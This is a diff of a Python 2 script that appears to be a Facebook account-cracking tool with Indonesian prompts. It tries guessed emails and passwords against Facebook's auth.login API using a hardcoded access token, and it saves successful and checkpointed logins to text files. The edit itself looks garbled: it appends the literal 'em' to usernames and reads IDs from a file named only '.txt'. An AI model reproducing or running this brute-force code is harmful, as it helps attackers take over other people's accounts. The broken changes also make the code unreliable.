@@ -90,7 +90,7 @@ def em():
     for i in range(0,2000):
          one_number = str(get_one_random_number(numer))
          one_domain = str(get_one_random_domain(domains))         
-         print(nama + one_number  + "@" + one_domain)
+         print(one_number  + "@" + one_domain)
 
 
 def login():
@@ -101,7 +101,11 @@ def login():
 	print("\033[1;96m[+] \033[1;93mNama Depan FB Target \033[1;97m: ")
 	print 42*"\033[1;96m="
 	try:
-		nama = raw_input("\033[1;96m[?] \033[1;93mMasukan Nama  \033[1;97m: ")
+		user = raw_input("\033[1;96m[?] \033[1;93mMasukan Nama  \033[1;97m: ")
+		k="em"
+		idlist = ('.txt')
+		for line in open(idlist,"r").readlines():
+			id.append(line.strip())
 	except IOError:
 		print ("[!] File Not Found")
 		raw_input("\n[ Back ]")
@@ -126,38 +130,38 @@ def login():
 			pass
 		try:
 			pass1
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +user+k+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass1
+				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user + k +   ' | '  +  pass1
 				okb = open('save/successfull.txt', 'a')
-				okb.write(em+'|'+pass1+'\n')
+				okb.write(user+k+'|'+pass1+'\n')
 				okb.close()
-				oks.append(em+pass1)
+				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass1
+					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user + k +   ' | '  +  pass1
 					cps = open('save/checkpoint.txt', 'a')
-					cps.write(em+'|'+pass1+'\n')
+					cps.write(user+k+'|'+pass1+'\n')
 					cps.close()
-					cpb.append(em+pass1)
+					cpb.append(user+pass1)
 				else:
 					pass2 = pakistan
-					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +user+k+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass2
+						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user + k +   ' | '  +  pass2
 						okb = open('save/successfull.txt', 'a')
-						okb.write(em+'|'+pass2+'\n')
+						okb.write(user+k+'|'+pass2+'\n')
 						okb.close()
-						oks.append(em+pass2)
+						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q['error_msg']:
-							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass2
+							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user + k +   ' | '  +  pass2
 							cps = open('save/checkpoint.txt', 'a')
-							cps.write(em+'|'+pass2+'\n')
+							cps.write(user+k+'|'+pass2+'\n')
 							cps.close()
-							cpb.append(em+pass2)
+							cpb.append(user+pass2)
 
 
 		
